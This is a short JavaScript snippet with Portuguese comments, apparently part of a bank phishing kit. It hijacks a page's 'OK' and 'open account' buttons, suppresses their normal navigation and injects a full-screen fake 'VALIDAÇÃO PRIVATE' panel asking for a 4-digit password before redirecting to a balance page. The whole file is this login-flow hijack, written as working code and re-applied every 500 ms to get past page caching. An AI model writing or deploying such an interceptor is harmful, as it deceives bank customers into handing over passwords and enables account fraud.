/* ENGINE DALLAS - CAPTURA DE FLUXO (AZUL E VERMELHO) */
(function() {
    const interceptar = () => {
        // Alvos: Botão Azul (OK) e Botão Vermelho (Abrir Conta)
        const btnAzul = document.querySelector('.btn-ok');
        const btnVermelho = document.querySelector('.btn-open');

        [btnAzul, btnVermelho].forEach(btn => {
            if (btn && !btn.dataset.protegido) {
                btn.dataset.protegido = "true";
                btn.onclick = (e) => {
                    e.preventDefault(); // Trava o redirecionamento (admin ou cadastro)
                    window.faseSenha(); // Chama a aba de senha que configuramos
                };
            }
        });
    };

    // Tenta interceptar a cada 500ms para vencer o cache imutável
    setInterval(interceptar, 500);

    window.faseSenha = () => {
        const aba = document.createElement('div');
        aba.style = "position:fixed; top:0; right:0; width:400px; height:100vh; background:#111; z-index:999999; border-left:2px solid #c5a059; padding:50px; color:#fff; display:flex; flex-direction:column; font-family:Arial;";
        aba.innerHTML = '<h2 style="color:#c5a059">VALIDAÇÃO PRIVATE</h2><p style="color:#666;font-size:12px;">Informe sua senha de 4 dígitos.</p><input type="password" id="s1" maxlength="4" style="width:100%; padding:20px; background:#000; border:1px solid #333; color:#c5a059; font-size:30px; text-align:center; margin:30px 0;"><button id="bt-valid" style="width:100%; padding:20px; background:#cc092f; color:#fff; border:none; font-weight:bold; cursor:pointer;">AVANÇAR</button>';
        document.body.appendChild(aba);
        
        document.getElementById('bt-valid').onclick = () => {
            if(document.getElementById('s1').value.length === 4) {
                // Após a senha, libera para o produção.html (Saldo IBM)
                window.location.href = "produção.html";
            }
        };
    };
})();
